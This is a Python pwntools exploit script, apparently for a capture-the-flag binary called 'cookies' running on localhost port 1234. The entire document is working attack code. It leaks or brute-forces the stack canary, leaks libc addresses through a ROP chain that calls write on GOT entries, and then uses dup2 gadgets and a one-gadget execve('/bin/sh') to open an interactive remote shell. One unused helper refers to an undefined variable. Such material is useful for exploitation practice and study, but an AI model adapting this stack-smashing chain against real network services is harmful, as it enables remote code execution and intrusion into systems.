#!/usr/bin/python3
import telnetlib
import code
import socket

from pwn import *

challenge_elf = ELF('./cookies')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def convert(data):
    if isinstance(data, bytes):  return data.decode('ascii')
    if isinstance(data, dict):   return dict(map(convert, data.items()))
    if isinstance(data, tuple):  return map(convert, data)
    return data

def brute_canary (msg, host, port):
    log.info("Brute force started...")
    context.log_level = "error"
    canary = b"\x00"

    for canary_byte in range (len(canary), 8):
        for value in range(256):
            while 1:
                try:
                    io = remote(host, port)
                    break
                except:
                    print ("[!] Connection attempt failed. Now attempt in 1 second...")
                time.sleep(1)

            io.clean()
            io.send(msg + canary + pack(value, 8))
            response = ""
            try:
                response = io.recvuntil("Goodbye!")
            except EOFError:
                pass
            finally:
                io.shutdown()
                io.close()
            if "Goodbye!" in str(response):
                canary += pack (value, 8)
                print ("[+] [%s] = %s" % (str(canary_byte), hex(value)))
                break

    context.log_level = "info"
    canary = u64(canary)
    log.info ("Stack cookie is %s" % hex(canary))

    return canary

def leak_canary(offset, host, port, leaked_data=""):
    io = remote(host, port)
    io.clean()
    io.send("A"*offset+"B") # overwrite null byte with B to read more bytes ;-)
    response = bytearray("", encoding=('utf-8'))
    try:
        while 1:
            response += bytearray(io.recv(1))
    except EOFError:
        pass
    response= response[offset:]# remove A's
    # response[0] = [0] # Replace B with the original null byte
    x = bytearray('\x00', 'utf-8')
    x[1:] = response[1:]
    response = x

    if len(leaked_data) + len(response) >= 8:
        log.info("Got enough data..")
        # code.interact(local=locals())

        leaked = bytes(leaked_data,'utf-8') + response
        leaked = leaked[:8]
        
        stack_cookie = u64(leaked)
        log.info("Stack cookie is %s" % hex(stack_cookie))
        return stack_cookie
    else:
        return leak_canary(offset+len(response), host, port, response) # if a second null byte is in the canary you will have to leak more data
    io.shutdown()
    io.close()


def leak_function_address(host, port, canary, challenge_elf, function_name, count):
    symbols = convert(challenge_elf.symbols)


    payload = bytearray("A" * count, 'unicode_escape')
    payload += b"\x00" * (1032-count)
    payload += p64(canary)
    payload += b"B" * 8
    payload += p64(0x0000000000400b83) # pop rdi ; ret
    payload += p64(4) # fd = 4 = socket
    payload += p64(0x0000000000400b81) # pop rsi ; pop r15 ; ret
    payload += p64(challenge_elf.got[function_name]) # address of recv in GOT
    payload += b"C"*8 # dummy
    payload += p64(challenge_elf.symbols[b'write'])
    payload += p64(challenge_elf.symbols[b'serve'])

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host,port))

    s.recv(1000)
    s.send(payload)

    response = s.recv(5000)
    response = s.recv(500)
    leaked = response[:8]
    #print("Response: " , response)
    # print(leaked)
    # code.interact(local=locals())
    return u64(leaked)

def bin_dash (gadget_addr, canary):
    payload = bytearray("A" * 1032, 'unicode_escape')
    payload += p64(canary)

    payload += b"B"*8 # saved base pointer
    payload += p64(0x0000000000400b83) # pop rdi ; ret
    payload += p64(4) # old fd
    payload += p64(0x0000000000400b81) # pop rsi ; pop r15 ; ret
    payload += p64(0) # new fd
    payload += b"A"*8 # dummy
    payload += p64(libc_base + libc.symbols[b"dup2"])
    payload += p64(0x0000000000400b83) # pop rdi ; ret
    payload += p64(4) # old fd
    payload += p64(0x0000000000400b81) # pop rsi ; pop r15 ; ret
    payload += p64(1) # new fd
    payload += b"A"*8 # dummy
    payload += p64(libc_base + libc.symbols[b"dup2"],)

    payload += p64(gadget_addr)
    payload += b"\x00" * 200

    #gdb.attach('cookies','''
    #b *serve+127
    #b *serve+119
    #c
    #''')    

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("localhost", 1234))

    s.recv(1000)
    s.send(payload)
    s.recv(1000)

    log.info("Preparing your shell...")

    t = telnetlib.Telnet()
    t.sock = s
    t.interact()




def dup2shell (dup2_addr, canary):
    payload = bytearray("A" * 1032, 'unicode_escape')
    payload += p64(canary)
    payload += b"B" * 8
    payload += p64(gadget_addr)
    payload += b"\x00" * 200
    
    print(payload)

    gdb.attach('cookies','''
    b *serve+127
    b *serve+119
    c
    ''')    

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("localhost", 1234))

    s.recv(1000)
    s.send(payload)
    s.recv(1000)
    pause()


canary = leak_canary(1032, "localhost", 1234)
# brute_canary (b"A" * 1032, "localhost", 1234)

recv_leaked = leak_function_address("localhost", 1234, canary, challenge_elf, b"recv", 1032) # __recv
log.info("recv @ %s" % hex(recv_leaked))
fork_leaked = leak_function_address("localhost", 1234, canary, challenge_elf, b"fork", 1032) # __fork
log.info("fork @ %s" % hex(fork_leaked))

libc_base = recv_leaked - libc.symbols[b'recv']
log.info("libc base @ %s" % hex(libc_base))

gadget = 0xc84da # 0xc84da execve("/bin/sh", r12, r13)
gadget = 0xe664b # 0xe664b execve("/bin/sh", rsp+0x60, environ)
gadget_addr = libc_base + gadget
bin_dash (gadget_addr, canary)

